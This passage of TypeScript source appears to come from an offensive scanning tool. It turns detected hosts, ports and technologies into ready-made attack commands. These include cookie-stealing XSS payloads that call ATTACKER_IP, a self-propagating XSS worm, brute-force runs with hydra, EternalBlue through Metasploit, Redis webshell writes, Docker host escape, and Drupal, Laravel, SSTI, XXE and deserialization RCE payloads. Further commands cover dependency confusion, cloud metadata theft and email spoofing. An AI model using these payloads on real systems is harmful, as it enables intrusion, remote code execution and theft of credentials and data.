      cmd = `# Stored XSS ג€” CRITICAL: payload runs for every viewer\n\n# Admin session steal (fires when admin views content):\n<script>fetch('https://ATTACKER_IP/steal?c='+document.cookie+'&url='+location.href,{mode:'no-cors'})</script>\n\n# CSRF via stored XSS (change victim email):\n<script>fetch('/api/user/settings',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'attacker@evil.com'})})</script>\n\n# XSS worm (self-propagating):\n<script>var x=new XMLHttpRequest();x.open('POST','/${x.parameter.includes('comment') ? 'comment' : 'input'}',true);x.withCredentials=true;x.send('${x.parameter}='+encodeURIComponent(document.currentScript.outerHTML))</script>`
    } else if (x.type === 'header') {
      desc = `Header XSS via "${x.parameter}" ג€” injection through HTTP request header`
      cmd = `# Header-based XSS ג€” fires when header value is reflected in response\n\n# Direct test:\ncurl -v "${x.url}" -H '${x.parameter}: <script>alert(1)</script>'\n\n# Session theft via header reflection:\ncurl "${x.url}" -H '${x.parameter}: <img src=x onerror=fetch(\"https://ATTACKER_IP/?c=\"+document.cookie)>'\n\n# Log poisoning chain (if server logs shown in admin panel):\ncurl "${x.url}" -H "${x.parameter}: <script src=https://ATTACKER_IP/hook.js></script>"`
    }

    push({ id:`xss-${x.type}-${x.url}-${x.parameter}`, vulnName:`${x.type.charAt(0).toUpperCase()+x.type.slice(1)} XSS: ${x.parameter}`, host:x.url, severity:toSeverity(x.severity), category:'xss', tool:x.tool||'browser', parameter:x.parameter, command:cmd, description:desc, warning, evidence:x.evidence })
  }

  // ג”€ג”€ IDOR ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€
  for (const r of scan.idorResults || []) {
    let enumerateCmd = ''
    const safeUrl = (val: string) => r.url.replace(r.testedValue, val)

    if (r.type === 'numeric') {
      enumerateCmd = `# Enumerate ${r.parameter} values 1ג€“500:\nfor i in $(seq 1 500); do\n  code=$(curl -s -o /dev/null -w "%{http_code}" "${safeUrl('$i')}" -H "Cookie: YOUR_SESSION")\n  [ "$code" = "200" ] && echo "HIT $i: $code"\ndone\n\n# Faster with ffuf:\nffuf -u "${safeUrl('FUZZ')}" -H "Cookie: YOUR_SESSION" -w <(seq 1 1000) -mc 200`
    } else if (r.type === 'uuid') {
      enumerateCmd = `# UUID IDOR ג€” harvest UUIDs from other API responses first:\n# GET /api/users, /api/activity, /api/friends ג†’ collect UUIDs\n# Then test each:\nfor uuid in UUID_A UUID_B UUID_C; do\n  echo -n "$uuid: "\n  curl -s "${safeUrl('$uuid')}" -H "Cookie: YOUR_SESSION" | python3 -m json.tool\ndone`
    } else if (r.type === 'filename') {
      enumerateCmd = `# Filename IDOR ג€” try predictable names:\nfor f in admin config backup database users settings export; do\n  code=$(curl -s -o /dev/null -w "%{http_code}" "${safeUrl('$f')}" -H "Cookie: YOUR_SESSION")\n  echo "$f: $code"\ndone`
    } else if (r.type === 'path-traversal') {
      enumerateCmd = `# Path traversal IDOR:\ncurl -s "${safeUrl('../admin')}" -H "Cookie: YOUR_SESSION"\ncurl -s "${safeUrl('../../etc/passwd')}" -H "Cookie: YOUR_SESSION"\ncurl -s "${safeUrl('%2e%2e%2fadmin')}" -H "Cookie: YOUR_SESSION"`
    }

    push({ id:`idor-${r.type}-${r.url}-${r.parameter}`, vulnName:`IDOR (${r.type}): ${r.parameter}`, host:r.url, severity:toSeverity(r.severity), category:'idor', tool:'curl', parameter:r.parameter,
      command:`# Confirm IDOR:\ncurl -s "${r.url}" -H "Cookie: YOUR_SESSION"\n# Expected: another user's data. Original value: ${r.originalValue}, Tested: ${r.testedValue}\n\n${enumerateCmd}`,
      description:`IDOR on "${r.parameter}" (${r.type}) ג€” access other users' data. Evidence: ${r.evidence.slice(0,100)}`, evidence:r.evidence })
  }

  // ג”€ג”€ PORTS ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€
  for (const port of openPorts) {
    const ph = port.host
    if (port.port === 22)  push({ id:`bf-ssh-${ph}`, vulnName:'SSH Open', host:ph, severity:'high', category:'brute-force', tool:'hydra', command:`hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://${ph}\nhydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://${ph}`, description:'SSH brute-force for shell access' })
    if (port.port === 21)  push({ id:`bf-ftp-${ph}`, vulnName:'FTP Open', host:ph, severity:'high', category:'brute-force', tool:'hydra', command:`# Check anonymous:\nftp ${ph}\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://${ph}`, description:'FTP ג€” try anonymous login, brute-force, download files' })
    if (port.port === 3389) push({ id:`bf-rdp-${ph}`, vulnName:'RDP Open', host:ph, severity:'high', category:'brute-force', tool:'crowbar', command:`crowbar -b rdp -s ${ph}/32 -u administrator -C /usr/share/wordlists/rockyou.txt\nnmap --script rdp-vuln-ms12-020 ${ph} -p 3389`, description:'RDP brute-force + BlueKeep/DejaBlue check', warning:'Internet-exposed RDP = critical attack surface' })
    if (port.port === 445)  push({ id:`rce-smb-${ph}`, vulnName:'SMB Open', host:ph, severity:'critical', category:'rce', tool:'metasploit', command:`nmap --script smb-vuln-* ${ph} -p 445\nmsfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS ${ph}; set LHOST LHOST; run"\nimpacket-psexec administrator@${ph} -hashes :NTLM_HASH`, description:'SMB ג€” EternalBlue RCE, pass-the-hash', warning:'EternalBlue = ransomware delivery vector' })
    if (port.port === 1433) push({ id:`sqli-mssql-${ph}`, vulnName:'MSSQL Open', host:ph, severity:'critical', category:'sqli', tool:'impacket', command:`impacket-mssqlclient sa@${ph}\nnmap --script ms-sql-brute ${ph} -p 1433\n# RCE via xp_cmdshell:\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';`, description:'MSSQL ג€” brute SA account, enable xp_cmdshell for OS RCE' })
    if (port.port === 3306) push({ id:`sqli-mysql-${ph}`, vulnName:'MySQL Open', host:ph, severity:'high', category:'sqli', tool:'mysql', command:`mysql -h ${ph} -u root -p\nhydra -l root -P /usr/share/wordlists/rockyou.txt mysql://${ph}\nmysqldump -h ${ph} -u root -p --all-databases > dump.sql`, description:'MySQL exposed ג€” brute root, dump all databases' })
    if (port.port === 5432) push({ id:`sqli-psql-${ph}`, vulnName:'PostgreSQL Open', host:ph, severity:'high', category:'sqli', tool:'psql', command:`psql -h ${ph} -U postgres\nhydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://${ph}\n# RCE:\nCOPY cmd_output FROM PROGRAM 'id';`, description:'PostgreSQL ג€” brute-force, dump, RCE via COPY FROM PROGRAM' })
    if (port.port === 6379) push({ id:`rce-redis-${ph}`, vulnName:'Redis Open', host:ph, severity:'critical', category:'rce', tool:'redis-cli', command:`redis-cli -h ${ph} ping\n# Webshell:\nredis-cli -h ${ph} config set dir /var/www/html\nredis-cli -h ${ph} config set dbfilename shell.php\nredis-cli -h ${ph} set payload "<?php system($_GET['cmd']); ?>"\nredis-cli -h ${ph} save`, description:'Redis no-auth ג€” write webshell, achieve RCE', warning:'Unauthenticated Redis is critical' })
    if (port.port === 27017) push({ id:`cred-mongo-${ph}`, vulnName:'MongoDB Open', host:ph, severity:'critical', category:'credential-harvest', tool:'mongosh', command:`mongosh mongodb://${ph}:27017\nshow dbs\nuse admin; db.getUsers()\ndb.adminCommand({listDatabases:1})`, description:'MongoDB no-auth ג€” dump all databases and credentials' })
    if (port.port === 9200) push({ id:`cred-es-${ph}`, vulnName:'Elasticsearch Open', host:ph, severity:'critical', category:'credential-harvest', tool:'curl', command:`curl http://${ph}:9200/_cat/indices?v\ncurl http://${ph}:9200/_all/_search?size=100\ncurl http://${ph}:9200/_security/user`, description:'Elasticsearch no-auth ג€” dump all indices, find PII and secrets' })
    if (port.port === 5900) push({ id:`bf-vnc-${ph}`, vulnName:'VNC Open', host:ph, severity:'critical', category:'brute-force', tool:'hydra', command:`hydra -P /usr/share/wordlists/rockyou.txt vnc://${ph}\nvncviewer ${ph}:5900`, description:'VNC ג€” brute-force for full desktop access', warning:'Internet-exposed VNC = often unpatched' })
    if (port.port === 2375) push({ id:`rce-docker-${ph}`, vulnName:'Docker API Open', host:ph, severity:'critical', category:'rce', tool:'docker', command:`docker -H tcp://${ph}:2375 ps\ndocker -H tcp://${ph}:2375 run --rm -it --privileged --pid=host ubuntu nsenter -t 1 -m -u -i -n -p -- /bin/bash\ndocker -H tcp://${ph}:2375 run -v /:/host -it ubuntu chroot /host`, description:'Docker daemon exposed ג€” container escape to host', warning:'Unauthenticated Docker = full server compromise' })
    if (port.port === 6443 || port.port === 10250) push({ id:`rce-k8s-${ph}`, vulnName:'Kubernetes API', host:ph, severity:'critical', category:'rce', tool:'kubectl', command:`curl -sk https://${ph}:6443/api/v1/secrets\ncurl -sk https://${ph}:10250/run/NAMESPACE/POD/CONTAINER -d "cmd=id"\nkubectl --server=https://${ph}:6443 get secrets -A`, description:'Kubernetes API/Kubelet ג€” exec pods, read secrets, node escape' })
    if (port.port === 5985) push({ id:`rce-winrm-${ph}`, vulnName:'WinRM Open', host:ph, severity:'high', category:'rce', tool:'evil-winrm', command:`evil-winrm -i ${ph} -u administrator -p PASSWORD\nevil-winrm -i ${ph} -u administrator -H NTLM_HASH`, description:'WinRM ג€” remote PowerShell execution' })
    if (port.port === 50000) push({ id:`rce-jenkins-${ph}`, vulnName:'Jenkins Open', host:ph, severity:'critical', category:'rce', tool:'curl', command:`curl http://${ph}:50000/\ncurl -X POST http://${ph}:50000/scriptText --data 'script=println("id".execute().text)'`, description:'Jenkins Groovy console ג€” RCE, credential dumping' })
    if (port.port === 9092) push({ id:`api-kafka-${ph}`, vulnName:'Kafka Open', host:ph, severity:'high', category:'api-abuse', tool:'kafkacat', command:`kafkacat -b ${ph}:9092 -L\nkafkacat -b ${ph}:9092 -C -t TOPIC -o beginning`, description:'Kafka no-auth ג€” intercept all message streams' })
    if (port.port === 15672) push({ id:`cred-rabbit-${ph}`, vulnName:'RabbitMQ Mgmt', host:ph, severity:'high', category:'credential-harvest', tool:'curl', command:`curl -s http://${ph}:15672/api/overview -u guest:guest\ncurl -s http://${ph}:15672/api/queues -u guest:guest`, description:'RabbitMQ management ג€” default guest/guest credentials' })
    if (port.port === 11211) push({ id:`cred-memcached-${ph}`, vulnName:'Memcached Open', host:ph, severity:'high', category:'credential-harvest', tool:'nc', command:`echo -e "stats\\r" | nc ${ph} 11211\necho -e "stats items\\r" | nc ${ph} 11211`, description:'Memcached no-auth ג€” dump cached sessions and tokens' })
    if (port.port === 23) push({ id:`cred-telnet-${ph}`, vulnName:'Telnet Open', host:ph, severity:'critical', category:'credential-harvest', tool:'hydra', command:`telnet ${ph}\nhydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://${ph}`, description:'Telnet ג€” plaintext protocol, all traffic cleartext', warning:'All traffic visible to network sniffers' })

    // Version/banner ג†’ CVE auto-lookup (Fix 3)
    const versionStr = `${port.version || ''} ${port.banner || ''}`.trim()
    if (versionStr) {
      for (const vc of VERSION_CVE) {
        if (vc.pattern.test(versionStr) && CVE_EXPLOITS[vc.cve]) {
          const ex = CVE_EXPLOITS[vc.cve]
          const cmd = ex.msf
            ? `# ${vc.note} (detected: ${versionStr.slice(0, 60)})\nmsfconsole -q -x "use ${ex.msf}; set RHOSTS ${ph}; set LHOST LHOST; set LPORT LPORT; run"\nsearchsploit ${vc.cve}`
            : (ex.poc || '').replace(/TARGET/g, ph)
          push({ id:`cve-ver-${ph}-${port.port}-${vc.cve}`, vulnName:`${vc.cve}: ${vc.note}`, host:ph, severity:'critical', category:'rce', tool:ex.tool, cve:vc.cve,
            command: cmd, description:`${vc.note} ג€” banner: ${versionStr.slice(0, 80)}`,
            warning:`CVSS ${ex.cvss} ג€” weaponized exploits exist` })
          cvePushedHosts.add(ph)
        }
      }
    }
  }

  // ג”€ג”€ HTTP TECH WEAPONS ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€
  for (const h of scan.http) {
    const tech = (h.tech || []).map(t => t.toLowerCase())
    const hh = h.url
    if (tech.some(t => t.includes('wordpress')))
      push({ id:`api-xmlrpc-${hh}`, vulnName:'WordPress XML-RPC', host:hh, severity:'medium', category:'api-abuse', tool:'curl',
        command:`curl ${hh}/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'\n# Brute-force bypassing lockout via multicall:\nwpscan --url ${hh} --password-attack xmlrpc-multicall -P /usr/share/wordlists/rockyou.txt`,
        description:'WordPress XML-RPC ג€” brute-force without rate limiting, DDoS amplification' })
    if (tech.some(t => t.includes('drupal')) && !cvePushedHosts.has(hh))
      push({ id:`rce-drupal-${hh}`, vulnName:'Drupal Detected', host:hh, severity:'critical', category:'rce', tool:'droopescan',
        command:`droopescan scan drupal -u ${hh}\ncurl "${hh}/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id" -d "form_id=user_pass"`,
        description:'Drupal ג€” test Drupalgeddon2/3 RCE (CVE-2018-7600/7602)' })
    if (tech.some(t => t.includes('laravel')))
      if (!cvePushedHosts.has(hh))
        push({ id:`rce-laravel-${hh}`, vulnName:'Laravel Detected', host:hh, severity:'high', category:'rce', tool:'curl',
          command:`curl ${hh}/not-exist  # Check APP_DEBUG=true\ncurl ${hh}/_ignition/execute-solution -X POST -H 'Content-Type: application/json' -d '{"solution":"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"a","viewFile":"php://filter/convert.base64-encode/resource=/etc/passwd"}}'`,
          description:'Laravel ג€” debug mode RCE via CVE-2021-3129 (Ignition)' })

    // SSTI detection from tech
    if (tech.some(t => ['jinja2','twig','freemarker','pebble','velocity','smarty','mako'].some(e => t.includes(e)))) {
      const engine = (h.tech || []).find(t => ['jinja2','twig','freemarker','pebble','velocity','smarty','mako'].some(e => t.toLowerCase().includes(e))) || 'template engine'
      push({ id:`ssti-${hh}`, vulnName:`SSTI: ${engine}`, host:hh, severity:'critical', category:'ssti', tool:'curl',
        command:`# Detection:\ncurl "${hh}?name={{7*7}}"  # Jinja2/Twig\ncurl "${hh}?name=\${7*7}"  # FreeMarker\ncurl "${hh}?name=<%= 7*7 %>"  # EL/Pebble\n\n# RCE (Jinja2):\ncurl "${hh}?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"\n# RCE (Twig):\ncurl "${hh}?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{'id'|filter('exec')}}"`,
        description:`SSTI in ${engine} ג€” escalates to full RCE`, warning:'Template injection ג†’ OS command execution' })
    }

    // JWT detection
    if ((h.headers?.['set-cookie'] || '').includes('eyJ') || (h.headers?.['authorization'] || '').includes('eyJ'))
      push({ id:`jwt-${hh}`, vulnName:'JWT Detected', host:hh, severity:'high', category:'jwt', tool:'jwt_tool',
        command:`# None algorithm bypass:\npython3 jwt_tool.py TOKEN -X a\n# Weak secret brute-force:\nhashcat -a 0 -m 16500 TOKEN /usr/share/wordlists/rockyou.txt\n# Algorithm confusion (RS256ג†’HS256):\npython3 jwt_tool.py TOKEN -X k -pk public.pem`,
        description:'JWT in use ג€” test none algorithm, weak secret, RS256ג†’HS256 confusion' })

    // WAF bypass
    if (h.waf)
      push({ id:`waf-bypass-${hh}`, vulnName:`WAF Bypass: ${h.waf}`, host:hh, severity:'medium', category:'waf-bypass', tool:'sqlmap',
        command:`# Case variation: UnIoN SeLeCt\n# URL encoding: %20UNION%20SELECT\n# Comments: /*!UNION*/ /*!SELECT*/\n# Null bytes: %00 between keywords\nsqlmap -u "${hh}?id=1" --tamper=between,charencode,space2comment,randomcase --level=5 --risk=3\n# HTTP header bypass:\ncurl -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" "${hh}"`,
        description:`${h.waf} detected ג€” use encoding/obfuscation to bypass filtering` })
  }

  // ג”€ג”€ SSTI generic (from dirs/crawl params) ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€
  const hasTemplateLang = allTech.has('python') || allTech.has('ruby') || allTech.has('php') || allTech.has('java')
  const hasReflectedParams = scan.jsEndpoints.some(e => e.type === 'parameter')
  if (hasTemplateLang && hasReflectedParams && !idSeen.has(`ssti-generic`))
    push({ id:`ssti-generic`, vulnName:'SSTI (Generic Test)', host, severity:'high', category:'ssti', tool:'curl',
      command:`# Test all reflected params:\ncurl "${host}?name={{7*7}}"\ncurl "${host}?name=\${7*7}"\ncurl "${host}?name=<%= 7*7 %>"\ncurl "${host}?name=#{7*7}"\n# If output is 49 ג†’ SSTI confirmed`,
      description:'Server-side template injection probe across all reflected parameters' })

  // ג”€ג”€ XXE (from XML endpoints in crawl) ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€
  const xmlEndpoints = scan.jsEndpoints.filter(e => e.url.includes('.xml') || e.url.includes('soap') || e.url.includes('/api') && e.type === 'endpoint')
  if (xmlEndpoints.length > 0)
    push({ id:`xxe-${host}`, vulnName:'XXE (XML Endpoints Found)', host, severity:'high', category:'xxe', tool:'curl',
      command:`curl -X POST https://${host}/api/xml -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'\n# Blind XXE via DNS:\ncurl -X POST https://${host}/api -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://INTERACTSH_URL/xxe">%xxe;]><root/>'`,
      description:'XML endpoints detected ג€” test for XXE file read and SSRF via DTD' })

  // ג”€ג”€ Deserialization ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€
  if (allTech.has('java') || allTech.has('asp.net'))
    push({ id:`deserialize-${host}`, vulnName:'Deserialization Risk', host, severity:'high', category:'deserialize', tool:'ysoserial',
      command:`# Java gadget chains:\njava -jar ysoserial.jar CommonsCollections6 'id' | base64 | curl -X POST https://${host}/api -d @-\n# .NET ViewState:\npython3 ysoserial.net/ysoserial/Program.cs -g TextFormattingRunProperties -f LosFormatter -c "powershell -c calc"\n# Test deserialization endpoints:\ncurl https://${host}/api -H 'Content-Type: application/x-java-serialized-object' -d $'\\xac\\xed'`,
      description:'Java/.NET detected ג€” test deserialization with gadget chains for RCE' })

  // ג”€ג”€ OAuth ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€
  const hasOauth = scan.jsEndpoints.some(e => e.url.includes('oauth') || e.url.includes('authorize') || e.url.includes('/auth/'))
  if (hasOauth)
    push({ id:`oauth-${host}`, vulnName:'OAuth Endpoints Found', host, severity:'high', category:'oauth', tool:'curl',
      command:`# redirect_uri bypass:\ncurl "https://${host}/oauth/authorize?client_id=app&redirect_uri=https://evil.com&response_type=code"\n# State CSRF:\ncurl "https://${host}/oauth/authorize?client_id=app&redirect_uri=https://${host}/callback&state=ATTACKER_STATE"\n# Token leakage via Referer:\n# Navigate to auth page from attacker page, capture auth code in Referer header`,
      description:'OAuth flow ג€” test redirect_uri bypass, state CSRF, token leakage' })

  // ג”€ג”€ Prototype Pollution ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€
  const jsFiles = scan.jsEndpoints.filter(e => e.url.endsWith('.js'))
  if (jsFiles.length > 3 && (allTech.has('node.js') || allTech.has('express.js') || allTech.has('next.js')))
    push({ id:`proto-${host}`, vulnName:'Prototype Pollution Risk', host, severity:'medium', category:'prototype-pollution', tool:'curl',
      command:`# URL parameter pollution:\ncurl "https://${host}?__proto__[admin]=true"\ncurl "https://${host}?constructor.prototype.admin=true"\n# JSON body pollution:\ncurl -X POST https://${host}/api -H 'Content-Type: application/json' -d '{"__proto__":{"admin":true}}'\n# Use prototype-pollution-finder in browser console`,
      description:'Node.js app with many JS files ג€” test prototype pollution for auth bypass' })

  // ג”€ג”€ Supply Chain ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€
  const packageJson = scan.dirs.find(d => d.url.includes('package.json') && d.status === 200)
  const composerJson = scan.dirs.find(d => d.url.includes('composer.json') && d.status === 200)
  if (packageJson)
    push({ id:`supply-chain-npm-${host}`, vulnName:'package.json Exposed', host, severity:'high', category:'supply-chain', tool:'curl',
      command:`curl -s ${packageJson.url} | python3 -m json.tool\n# Extract internal package names:\ncurl -s ${packageJson.url} | python3 -c "import json,sys; d=json.load(sys.stdin); [print(k) for k in {**d.get('dependencies',{}),**d.get('devDependencies',{})}.keys()]"\n# Register any internal package names on npmjs.com for dependency confusion`,
      description:'package.json exposed ג€” identify internal package names for dependency confusion attack', warning:'Dependency confusion can achieve RCE on developer machines and CI/CD' })
  if (composerJson)
    push({ id:`supply-chain-composer-${host}`, vulnName:'composer.json Exposed', host, severity:'high', category:'supply-chain', tool:'curl',
      command:`curl -s ${composerJson.url} | python3 -m json.tool\n# Register private packages on packagist.org for dependency confusion`,
      description:'composer.json exposed ג€” dependency confusion via Packagist' })

  // ג”€ג”€ Cloud ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€
  const awsTech = [...allTech].some(t => t.includes('aws') || t.includes('cloudfront') || t.includes('s3'))
  const azureTech = [...allTech].some(t => t.includes('azure') || t.includes('azurewebsites'))
  if (awsTech)
    push({ id:`cloud-aws-${host}`, vulnName:'AWS Infrastructure Detected', host, severity:'medium', category:'cloud', tool:'aws-cli',
      command:`# Enumerate S3 buckets:\naws s3 ls s3://${host} --no-sign-request\naws s3 ls s3://www.${host} --no-sign-request\n# Check for public bucket:\ncurl http://${host}.s3.amazonaws.com/\ncurl https://s3.amazonaws.com/${host}/\n# EC2 metadata (if SSRF):\ncurl http://169.254.169.254/latest/meta-data/`,
      description:'AWS detected ג€” enumerate S3 buckets, check public access, SSRF to metadata' })
  if (azureTech)
    push({ id:`cloud-azure-${host}`, vulnName:'Azure Infrastructure Detected', host, severity:'medium', category:'cloud', tool:'curl',
      command:`# Azure Blob Storage:\ncurl https://${host.split('.')[0]}.blob.core.windows.net/\n# Azure metadata:\ncurl -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01\n# Enumerate storage accounts:\nfor name in ${host.replace(/\./g,'')}{storage,blob,backup,data}; do curl -I https://$name.blob.core.windows.net/; done`,
      description:'Azure detected ג€” enumerate blob storage, test metadata endpoint via SSRF' })

  // ג”€ג”€ Business Logic ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€
  if (allTech.has('shopify') || allTech.has('woocommerce') || allTech.has('magento'))
    push({ id:`biz-logic-${host}`, vulnName:'E-Commerce Platform', host, severity:'medium', category:'business-logic', tool:'burp',
      command:`# Price manipulation:\ncurl -X POST https://${host}/cart -d "price=-1&qty=1"\n# Negative quantity:\ncurl -X POST https://${host}/checkout -d "quantity=-100&product_id=1"\n# Coupon stacking:\ncurl -X POST https://${host}/apply-coupon -d "code=SAVE50" -b "YOUR_SESSION"\n# Race condition on limited stock:\nfor i in $(seq 1 20); do curl -X POST https://${host}/buy -d "product_id=1" -b "YOUR_SESSION" &; done`,
      description:'E-commerce app ג€” test price manipulation, negative quantities, race conditions, coupon stacking' })

  // ג”€ג”€ DNS-based ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€
  const hasSPF = scan.dns.some(r => r.type === 'TXT' && r.value.includes('v=spf1'))
  const hasDMARC = scan.dns.some(r => r.type === 'DMARC')
  if (!hasSPF || !hasDMARC)
    push({ id:`email-spoof-${host}`, vulnName:'Email Spoofing (Missing SPF/DMARC)', host, severity:'high', category:'credential-harvest', tool:'swaks',
      command:`swaks --to target@${host} --from admin@${host} --server mail.${host} --header "Subject: Password Reset"\n# Verify with: nmap -p 25 ${host}`,
      description:`${!hasSPF?'No SPF':''}${!hasDMARC?' + No DMARC':''} ג€” spoofed sender bypasses email authentication` })

  // Subdomain takeover
  const takeovers = scan.dns.filter(r => r.type==='CNAME' && ['github.io','herokuapp.com','azurewebsites.net','s3.amazonaws.com','netlify.app','surge.sh'].some(s => r.value.includes(s)))
  for (const c of takeovers)
    push({ id:`takeover-${c.value}`, vulnName:'Subdomain Takeover', host:c.value, severity:'high', category:'takeover', tool:'curl',
      command:`curl -v ${c.value}\n# If unclaimed:\n# GitHub Pages: create repo matching subdomain\n# Heroku: heroku create APP_NAME\n# S3: aws s3 mb s3://BUCKET_NAME\n# Then serve XSS payload or content`,
      description:`CNAME ג†’ ${c.value} may be unclaimed ג€” host malicious content on legitimate subdomain` })

  // ג”€ג”€ OSINT ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€
  const emails = scan.osint.filter(o => o.type === 'email').map(o => o.value)
  if (emails.length > 0)
    push({ id:`cred-emails-${host}`, vulnName:`${emails.length} Emails Found`, host, severity:'medium', category:'credential-harvest', tool:'credmaster',
